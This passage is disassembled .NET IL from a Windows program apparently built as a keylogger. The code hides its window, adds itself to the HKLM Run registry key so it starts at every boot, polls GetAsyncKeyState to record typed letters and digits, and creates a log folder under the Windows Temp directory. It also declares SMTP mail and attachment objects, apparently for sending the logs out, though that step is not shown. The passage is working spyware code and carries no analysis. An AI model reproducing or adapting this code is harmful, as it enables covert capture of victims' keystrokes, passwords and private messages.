    IL_001d:  stfld      int32 gray.Form1::k
    IL_0022:  ldarg.0
    IL_0023:  call       instance void gray.Form1::InitializeComponent()
    IL_0028:  ret
  } // end of method Form1::.ctor

  .method public static void  Main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  newobj     instance void gray.Form1::.ctor()
    IL_0005:  call       void [System.Windows.Forms]System.Windows.Forms.Application::Run(class [System.Windows.Forms]System.Windows.Forms.Form)
    IL_000a:  ret
  } // end of method Form1::Main

  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 vKey) cil managed preservesig
  {
  }
  .method private instance void  Timer2_Tick(object sender,
                                             class [mscorlib]System.EventArgs e) cil managed
  {
    // Code size       161 (0xa1)
    .maxstack  3
    .locals init (int32 V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.0
    IL_0002:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ShowInTaskbar(bool)
    IL_0007:  ldarg.0
    IL_0008:  ldc.i4.0
    IL_0009:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ShowIcon(bool)
    IL_000e:  ldarg.0
    IL_000f:  ldc.r8     0.0
    IL_0018:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Opacity(float64)
    IL_001d:  ldarg.0
    IL_001e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::Hide()
    IL_0023:  ldarg.0
    IL_0024:  ldfld      int32 gray.Form1::k
    IL_0029:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_002e:  ldc.i4.0
    IL_002f:  stloc.0
    IL_0030:  ldloc.0
    IL_0031:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0036:  brfalse.s  IL_0094

    IL_0038:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_003d:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
    IL_0042:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
    IL_0047:  ldstr      "Windows"
    IL_004c:  callvirt   instance bool [mscorlib]System.String::Contains(string)
    IL_0051:  brfalse.s  IL_0094

    IL_0053:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_0058:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_005d:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
    IL_0062:  ldstr      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_0067:  ldc.i4.1
    IL_0068:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                bool)
    IL_006d:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ProductName()
    IL_0072:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
    IL_0077:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                       object)
    IL_007c:  ldarg.0
    IL_007d:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.Timer gray.Form1::get_Timer1()
    IL_0082:  ldc.i4.1
    IL_0083:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Timer::set_Enabled(bool)
    IL_0088:  ldarg.0
    IL_0089:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.Timer gray.Form1::get_Timer2()
    IL_008e:  ldc.i4.0
    IL_008f:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Timer::set_Enabled(bool)
    IL_0094:  ldloc.0
    IL_0095:  ldc.i4.1
    IL_0096:  add
    IL_0097:  stloc.0
    IL_0098:  ldloc.0
    IL_0099:  ldc.i4     0xff
    IL_009e:  ble.s      IL_0030

    IL_00a0:  ret
  } // end of method Form1::Timer2_Tick

  .method private instance void  Timer1_Tick(object sender,
                                             class [mscorlib]System.EventArgs e) cil managed
  {
    // Code size       3621 (0xe25)
    .maxstack  7
    .locals init (string V_0,
             bool V_1,
             bool V_2,
             string V_3,
             string V_4,
             string V_5,
             int32 V_6,
             string V_7,
             uint8[] V_8,
             uint8[] V_9,
             string V_10,
             class [System]System.Net.Mail.Attachment V_11,
             class [System]System.Net.Mail.MailMessage V_12,
             string V_13,
             class [System]System.Net.Mail.SmtpClient V_14,
             string[] V_15,
             int32 V_16,
             string V_17,
             object& V_18)
    IL_0000:  ldstr      "windir"
    IL_0005:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_000a:  ldstr      "\\Temp\\Logs\\"
    IL_000f:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0014:  stloc.0
    IL_0015:  ldloc.0
    IL_0016:  call       bool [mscorlib]System.IO.Directory::Exists(string)
    IL_001b:  brtrue.s   IL_0024

    IL_001d:  ldloc.0
    IL_001e:  call       class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.Directory::CreateDirectory(string)
    IL_0023:  pop
    IL_0024:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_0029:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_002e:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_0033:  stloc.1
    IL_0034:  ldc.i4.s   20
    IL_0036:  call       bool [System.Windows.Forms]System.Windows.Forms.Control::IsKeyLocked(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
    IL_003b:  ldc.i4.0
    IL_003c:  ceq
    IL_003e:  ldloc.1
    IL_003f:  ldc.i4.0
    IL_0040:  ceq
    IL_0042:  and
    IL_0043:  stloc.2
    IL_0044:  ldnull
    IL_0045:  stloc.3
    IL_0046:  ldc.i4.s   65
    IL_0048:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_004d:  ldc.i4.0
    IL_004e:  cgt.un
    IL_0050:  brfalse.s  IL_0077

    IL_0052:  ldloc.2
    IL_0053:  brfalse.s  IL_0066

    IL_0055:  ldloc.3
    IL_0056:  ldstr      "a"
    IL_005b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0060:  stloc.3
    IL_0061:  br         IL_0a97

    IL_0066:  ldloc.3
    IL_0067:  ldstr      "A"
    IL_006c:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0071:  stloc.3
    IL_0072:  br         IL_0a97

    IL_0077:  ldc.i4.s   66
    IL_0079:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_007e:  ldc.i4.0
    IL_007f:  cgt.un
    IL_0081:  brfalse.s  IL_00a8

    IL_0083:  ldloc.2
    IL_0084:  brfalse.s  IL_0097

    IL_0086:  ldloc.3
    IL_0087:  ldstr      "b"
    IL_008c:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0091:  stloc.3
    IL_0092:  br         IL_0a97

    IL_0097:  ldloc.3
    IL_0098:  ldstr      "B"
    IL_009d:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00a2:  stloc.3
    IL_00a3:  br         IL_0a97

    IL_00a8:  ldc.i4.s   67
    IL_00aa:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_00af:  ldc.i4.0
    IL_00b0:  cgt.un
    IL_00b2:  brfalse.s  IL_00d9

    IL_00b4:  ldloc.2
    IL_00b5:  brfalse.s  IL_00c8

    IL_00b7:  ldloc.3
    IL_00b8:  ldstr      "c"
    IL_00bd:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00c2:  stloc.3
    IL_00c3:  br         IL_0a97

    IL_00c8:  ldloc.3
    IL_00c9:  ldstr      "C"
    IL_00ce:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00d3:  stloc.3
    IL_00d4:  br         IL_0a97

    IL_00d9:  ldc.i4.s   68
    IL_00db:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_00e0:  ldc.i4.0
    IL_00e1:  cgt.un
    IL_00e3:  brfalse.s  IL_010a

    IL_00e5:  ldloc.2
    IL_00e6:  brfalse.s  IL_00f9

    IL_00e8:  ldloc.3
    IL_00e9:  ldstr      "d"
    IL_00ee:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00f3:  stloc.3
    IL_00f4:  br         IL_0a97

    IL_00f9:  ldloc.3
    IL_00fa:  ldstr      "D"
    IL_00ff:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0104:  stloc.3
    IL_0105:  br         IL_0a97

    IL_010a:  ldc.i4.s   69
    IL_010c:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0111:  ldc.i4.0
    IL_0112:  cgt.un
    IL_0114:  brfalse.s  IL_013b

    IL_0116:  ldloc.2
    IL_0117:  brfalse.s  IL_012a

    IL_0119:  ldloc.3
    IL_011a:  ldstr      "e"
    IL_011f:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0124:  stloc.3
    IL_0125:  br         IL_0a97

    IL_012a:  ldloc.3
    IL_012b:  ldstr      "E"
    IL_0130:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0135:  stloc.3
    IL_0136:  br         IL_0a97

    IL_013b:  ldc.i4.s   70
    IL_013d:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0142:  ldc.i4.0
    IL_0143:  cgt.un
    IL_0145:  brfalse.s  IL_016c

    IL_0147:  ldloc.2
    IL_0148:  brfalse.s  IL_015b

    IL_014a:  ldloc.3
    IL_014b:  ldstr      "f"
    IL_0150:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0155:  stloc.3
    IL_0156:  br         IL_0a97

    IL_015b:  ldloc.3
    IL_015c:  ldstr      "F"
    IL_0161:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0166:  stloc.3
    IL_0167:  br         IL_0a97

    IL_016c:  ldc.i4.s   71
    IL_016e:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0173:  ldc.i4.0
    IL_0174:  cgt.un
    IL_0176:  brfalse.s  IL_019d

    IL_0178:  ldloc.2
    IL_0179:  brfalse.s  IL_018c

    IL_017b:  ldloc.3
    IL_017c:  ldstr      "g"
    IL_0181:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0186:  stloc.3
    IL_0187:  br         IL_0a97

    IL_018c:  ldloc.3
    IL_018d:  ldstr      "G"
    IL_0192:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0197:  stloc.3
    IL_0198:  br         IL_0a97

    IL_019d:  ldc.i4.s   72
    IL_019f:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_01a4:  ldc.i4.0
    IL_01a5:  cgt.un
    IL_01a7:  brfalse.s  IL_01ce

    IL_01a9:  ldloc.2
    IL_01aa:  brfalse.s  IL_01bd

    IL_01ac:  ldloc.3
    IL_01ad:  ldstr      "h"
    IL_01b2:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01b7:  stloc.3
    IL_01b8:  br         IL_0a97

    IL_01bd:  ldloc.3
    IL_01be:  ldstr      "H"
    IL_01c3:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01c8:  stloc.3
    IL_01c9:  br         IL_0a97

    IL_01ce:  ldc.i4.s   73
    IL_01d0:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_01d5:  ldc.i4.0
    IL_01d6:  cgt.un
    IL_01d8:  brfalse.s  IL_01ff

    IL_01da:  ldloc.2
    IL_01db:  brfalse.s  IL_01ee

    IL_01dd:  ldloc.3
    IL_01de:  ldstr      "i"
    IL_01e3:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01e8:  stloc.3
    IL_01e9:  br         IL_0a97

    IL_01ee:  ldloc.3
    IL_01ef:  ldstr      "I"
    IL_01f4:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01f9:  stloc.3
    IL_01fa:  br         IL_0a97

    IL_01ff:  ldc.i4.s   74
    IL_0201:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0206:  ldc.i4.0
    IL_0207:  cgt.un
    IL_0209:  brfalse.s  IL_0230

    IL_020b:  ldloc.2
    IL_020c:  brfalse.s  IL_021f

    IL_020e:  ldloc.3
    IL_020f:  ldstr      "j"
    IL_0214:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0219:  stloc.3
    IL_021a:  br         IL_0a97

    IL_021f:  ldloc.3
    IL_0220:  ldstr      "J"
    IL_0225:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_022a:  stloc.3
    IL_022b:  br         IL_0a97

    IL_0230:  ldc.i4.s   75
    IL_0232:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0237:  ldc.i4.0
    IL_0238:  cgt.un
    IL_023a:  brfalse.s  IL_0261

    IL_023c:  ldloc.2
    IL_023d:  brfalse.s  IL_0250

    IL_023f:  ldloc.3
    IL_0240:  ldstr      "k"
    IL_0245:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_024a:  stloc.3
    IL_024b:  br         IL_0a97

    IL_0250:  ldloc.3
    IL_0251:  ldstr      "K"
    IL_0256:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_025b:  stloc.3
    IL_025c:  br         IL_0a97

    IL_0261:  ldc.i4.s   76
    IL_0263:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0268:  ldc.i4.0
    IL_0269:  cgt.un
    IL_026b:  brfalse.s  IL_0292

    IL_026d:  ldloc.2
    IL_026e:  brfalse.s  IL_0281

    IL_0270:  ldloc.3
    IL_0271:  ldstr      "l"
    IL_0276:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_027b:  stloc.3
    IL_027c:  br         IL_0a97

    IL_0281:  ldloc.3
    IL_0282:  ldstr      "L"
    IL_0287:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_028c:  stloc.3
    IL_028d:  br         IL_0a97

    IL_0292:  ldc.i4.s   77
    IL_0294:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0299:  ldc.i4.0
    IL_029a:  cgt.un
    IL_029c:  brfalse.s  IL_02c3

    IL_029e:  ldloc.2
    IL_029f:  brfalse.s  IL_02b2

    IL_02a1:  ldloc.3
    IL_02a2:  ldstr      "m"
    IL_02a7:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_02ac:  stloc.3
    IL_02ad:  br         IL_0a97

    IL_02b2:  ldloc.3
    IL_02b3:  ldstr      "M"
    IL_02b8:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_02bd:  stloc.3
    IL_02be:  br         IL_0a97

    IL_02c3:  ldc.i4.s   78
    IL_02c5:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_02ca:  ldc.i4.0
    IL_02cb:  cgt.un
    IL_02cd:  brfalse.s  IL_02f4

    IL_02cf:  ldloc.2
    IL_02d0:  brfalse.s  IL_02e3

    IL_02d2:  ldloc.3
    IL_02d3:  ldstr      "n"
    IL_02d8:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_02dd:  stloc.3
    IL_02de:  br         IL_0a97

    IL_02e3:  ldloc.3
    IL_02e4:  ldstr      "N"
    IL_02e9:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_02ee:  stloc.3
    IL_02ef:  br         IL_0a97

    IL_02f4:  ldc.i4.s   79
    IL_02f6:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_02fb:  ldc.i4.0
    IL_02fc:  cgt.un
    IL_02fe:  brfalse.s  IL_0325

    IL_0300:  ldloc.2
    IL_0301:  brfalse.s  IL_0314

    IL_0303:  ldloc.3
    IL_0304:  ldstr      "o"
    IL_0309:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_030e:  stloc.3
    IL_030f:  br         IL_0a97

    IL_0314:  ldloc.3
    IL_0315:  ldstr      "O"
    IL_031a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_031f:  stloc.3
    IL_0320:  br         IL_0a97

    IL_0325:  ldc.i4.s   80
    IL_0327:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_032c:  ldc.i4.0
    IL_032d:  cgt.un
    IL_032f:  brfalse.s  IL_0356

    IL_0331:  ldloc.2
    IL_0332:  brfalse.s  IL_0345

    IL_0334:  ldloc.3
    IL_0335:  ldstr      "p"
    IL_033a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_033f:  stloc.3
    IL_0340:  br         IL_0a97

    IL_0345:  ldloc.3
    IL_0346:  ldstr      "P"
    IL_034b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0350:  stloc.3
    IL_0351:  br         IL_0a97

    IL_0356:  ldc.i4.s   81
    IL_0358:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_035d:  ldc.i4.0
    IL_035e:  cgt.un
    IL_0360:  brfalse.s  IL_0387

    IL_0362:  ldloc.2
    IL_0363:  brfalse.s  IL_0376

    IL_0365:  ldloc.3
    IL_0366:  ldstr      "q"
    IL_036b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0370:  stloc.3
    IL_0371:  br         IL_0a97

    IL_0376:  ldloc.3
    IL_0377:  ldstr      "Q"
    IL_037c:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0381:  stloc.3
    IL_0382:  br         IL_0a97

    IL_0387:  ldc.i4.s   82
    IL_0389:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_038e:  ldc.i4.0
    IL_038f:  cgt.un
    IL_0391:  brfalse.s  IL_03b8

    IL_0393:  ldloc.2
    IL_0394:  brfalse.s  IL_03a7

    IL_0396:  ldloc.3
    IL_0397:  ldstr      "r"
    IL_039c:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_03a1:  stloc.3
    IL_03a2:  br         IL_0a97

    IL_03a7:  ldloc.3
    IL_03a8:  ldstr      "R"
    IL_03ad:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_03b2:  stloc.3
    IL_03b3:  br         IL_0a97

    IL_03b8:  ldc.i4.s   83
    IL_03ba:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_03bf:  ldc.i4.0
    IL_03c0:  cgt.un
    IL_03c2:  brfalse.s  IL_03e9

    IL_03c4:  ldloc.2
    IL_03c5:  brfalse.s  IL_03d8

    IL_03c7:  ldloc.3
    IL_03c8:  ldstr      "s"
    IL_03cd:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_03d2:  stloc.3
    IL_03d3:  br         IL_0a97

    IL_03d8:  ldloc.3
    IL_03d9:  ldstr      "S"
    IL_03de:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_03e3:  stloc.3
    IL_03e4:  br         IL_0a97

    IL_03e9:  ldc.i4.s   84
    IL_03eb:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_03f0:  ldc.i4.0
    IL_03f1:  cgt.un
    IL_03f3:  brfalse.s  IL_041a

    IL_03f5:  ldloc.2
    IL_03f6:  brfalse.s  IL_0409

    IL_03f8:  ldloc.3
    IL_03f9:  ldstr      "t"
    IL_03fe:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0403:  stloc.3
    IL_0404:  br         IL_0a97

    IL_0409:  ldloc.3
    IL_040a:  ldstr      "T"
    IL_040f:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0414:  stloc.3
    IL_0415:  br         IL_0a97

    IL_041a:  ldc.i4.s   85
    IL_041c:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0421:  ldc.i4.0
    IL_0422:  cgt.un
    IL_0424:  brfalse.s  IL_044b

    IL_0426:  ldloc.2
    IL_0427:  brfalse.s  IL_043a

    IL_0429:  ldloc.3
    IL_042a:  ldstr      "u"
    IL_042f:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0434:  stloc.3
    IL_0435:  br         IL_0a97

    IL_043a:  ldloc.3
    IL_043b:  ldstr      "U"
    IL_0440:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0445:  stloc.3
    IL_0446:  br         IL_0a97

    IL_044b:  ldc.i4.s   86
    IL_044d:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0452:  ldc.i4.0
    IL_0453:  cgt.un
    IL_0455:  brfalse.s  IL_047c

    IL_0457:  ldloc.2
    IL_0458:  brfalse.s  IL_046b

    IL_045a:  ldloc.3
    IL_045b:  ldstr      "v"
    IL_0460:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0465:  stloc.3
    IL_0466:  br         IL_0a97

    IL_046b:  ldloc.3
    IL_046c:  ldstr      "V"
    IL_0471:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0476:  stloc.3
    IL_0477:  br         IL_0a97

    IL_047c:  ldc.i4.s   87
    IL_047e:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0483:  ldc.i4.0
    IL_0484:  cgt.un
    IL_0486:  brfalse.s  IL_04ad

    IL_0488:  ldloc.2
    IL_0489:  brfalse.s  IL_049c

    IL_048b:  ldloc.3
    IL_048c:  ldstr      "w"
    IL_0491:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0496:  stloc.3
    IL_0497:  br         IL_0a97

    IL_049c:  ldloc.3
    IL_049d:  ldstr      "W"
    IL_04a2:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_04a7:  stloc.3
    IL_04a8:  br         IL_0a97

    IL_04ad:  ldc.i4.s   88
    IL_04af:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_04b4:  ldc.i4.0
    IL_04b5:  cgt.un
    IL_04b7:  brfalse.s  IL_04de

    IL_04b9:  ldloc.2
    IL_04ba:  brfalse.s  IL_04cd

    IL_04bc:  ldloc.3
    IL_04bd:  ldstr      "x"
    IL_04c2:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_04c7:  stloc.3
    IL_04c8:  br         IL_0a97

    IL_04cd:  ldloc.3
    IL_04ce:  ldstr      "X"
    IL_04d3:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_04d8:  stloc.3
    IL_04d9:  br         IL_0a97

    IL_04de:  ldc.i4.s   89
    IL_04e0:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_04e5:  ldc.i4.0
    IL_04e6:  cgt.un
    IL_04e8:  brfalse.s  IL_050f

    IL_04ea:  ldloc.2
    IL_04eb:  brfalse.s  IL_04fe

    IL_04ed:  ldloc.3
    IL_04ee:  ldstr      "y"
    IL_04f3:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_04f8:  stloc.3
    IL_04f9:  br         IL_0a97

    IL_04fe:  ldloc.3
    IL_04ff:  ldstr      "Y"
    IL_0504:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0509:  stloc.3
    IL_050a:  br         IL_0a97

    IL_050f:  ldc.i4.s   90
    IL_0511:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0516:  ldc.i4.0
    IL_0517:  cgt.un
    IL_0519:  brfalse.s  IL_0540

    IL_051b:  ldloc.2
    IL_051c:  brfalse.s  IL_052f

    IL_051e:  ldloc.3
    IL_051f:  ldstr      "z"
    IL_0524:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0529:  stloc.3
    IL_052a:  br         IL_0a97

    IL_052f:  ldloc.3
    IL_0530:  ldstr      "Z"
    IL_0535:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_053a:  stloc.3
    IL_053b:  br         IL_0a97

    IL_0540:  ldc.i4.s   48
    IL_0542:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0547:  ldc.i4.0
    IL_0548:  cgt.un
    IL_054a:  brfalse.s  IL_0571

    IL_054c:  ldloc.1
    IL_054d:  brfalse.s  IL_0560

    IL_054f:  ldloc.3
    IL_0550:  ldstr      ")"
    IL_0555:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_055a:  stloc.3
    IL_055b:  br         IL_0a97

    IL_0560:  ldloc.3
    IL_0561:  ldstr      "0"
    IL_0566:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_056b:  stloc.3
    IL_056c:  br         IL_0a97

    IL_0571:  ldc.i4.s   49
    IL_0573:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0578:  ldc.i4.0
    IL_0579:  cgt.un
    IL_057b:  brfalse.s  IL_05a2

    IL_057d:  ldloc.1
    IL_057e:  brfalse.s  IL_0591

    IL_0580:  ldloc.3
    IL_0581:  ldstr      "!"
    IL_0586:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_058b:  stloc.3
    IL_058c:  br         IL_0a97

    IL_0591:  ldloc.3
    IL_0592:  ldstr      "1"
    IL_0597:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_059c:  stloc.3
    IL_059d:  br         IL_0a97

    IL_05a2:  ldc.i4.s   50
    IL_05a4:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_05a9:  ldc.i4.0
    IL_05aa:  cgt.un
    IL_05ac:  brfalse.s  IL_05d3

    IL_05ae:  ldloc.1
    IL_05af:  brfalse.s  IL_05c2

    IL_05b1:  ldloc.3
    IL_05b2:  ldstr      "@"
    IL_05b7:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_05bc:  stloc.3
    IL_05bd:  br         IL_0a97

    IL_05c2:  ldloc.3
    IL_05c3:  ldstr      "2"
    IL_05c8:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_05cd:  stloc.3
    IL_05ce:  br         IL_0a97

    IL_05d3:  ldc.i4.s   51
    IL_05d5:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_05da:  ldc.i4.0
    IL_05db:  cgt.un
    IL_05dd:  brfalse.s  IL_0604

    IL_05df:  ldloc.1
    IL_05e0:  brfalse.s  IL_05f3

    IL_05e2:  ldloc.3
    IL_05e3:  ldstr      "#"
    IL_05e8:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_05ed:  stloc.3
    IL_05ee:  br         IL_0a97

    IL_05f3:  ldloc.3
    IL_05f4:  ldstr      "3"
    IL_05f9:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_05fe:  stloc.3
    IL_05ff:  br         IL_0a97

    IL_0604:  ldc.i4.s   52
    IL_0606:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_060b:  ldc.i4.0
    IL_060c:  cgt.un
    IL_060e:  brfalse.s  IL_0635

    IL_0610:  ldloc.1
    IL_0611:  brfalse.s  IL_0624

    IL_0613:  ldloc.3
    IL_0614:  ldstr      "$"
    IL_0619:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_061e:  stloc.3
    IL_061f:  br         IL_0a97

    IL_0624:  ldloc.3
    IL_0625:  ldstr      "4"
    IL_062a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_062f:  stloc.3
    IL_0630:  br         IL_0a97

    IL_0635:  ldc.i4.s   53
    IL_0637:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_063c:  ldc.i4.0
    IL_063d:  cgt.un
    IL_063f:  brfalse.s  IL_0666

    IL_0641:  ldloc.1
    IL_0642:  brfalse.s  IL_0655

    IL_0644:  ldloc.3
    IL_0645:  ldstr      "%"
    IL_064a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_064f:  stloc.3
    IL_0650:  br         IL_0a97

    IL_0655:  ldloc.3
    IL_0656:  ldstr      "5"
    IL_065b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0660:  stloc.3
    IL_0661:  br         IL_0a97

    IL_0666:  ldc.i4.s   54
    IL_0668:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_066d:  ldc.i4.0
    IL_066e:  cgt.un
    IL_0670:  brfalse.s  IL_0697

    IL_0672:  ldloc.1
    IL_0673:  brfalse.s  IL_0686

    IL_0675:  ldloc.3
    IL_0676:  ldstr      "^"
    IL_067b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0680:  stloc.3
    IL_0681:  br         IL_0a97

    IL_0686:  ldloc.3
    IL_0687:  ldstr      "6"
    IL_068c:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0691:  stloc.3
    IL_0692:  br         IL_0a97

    IL_0697:  ldc.i4.s   55
    IL_0699:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_069e:  ldc.i4.0
    IL_069f:  cgt.un
    IL_06a1:  brfalse.s  IL_06c8

    IL_06a3:  ldloc.1
    IL_06a4:  brfalse.s  IL_06b7

    IL_06a6:  ldloc.3
    IL_06a7:  ldstr      "&"
    IL_06ac:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_06b1:  stloc.3
    IL_06b2:  br         IL_0a97

    IL_06b7:  ldloc.3
    IL_06b8:  ldstr      "7"
    IL_06bd:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_06c2:  stloc.3
    IL_06c3:  br         IL_0a97

    IL_06c8:  ldc.i4.s   56
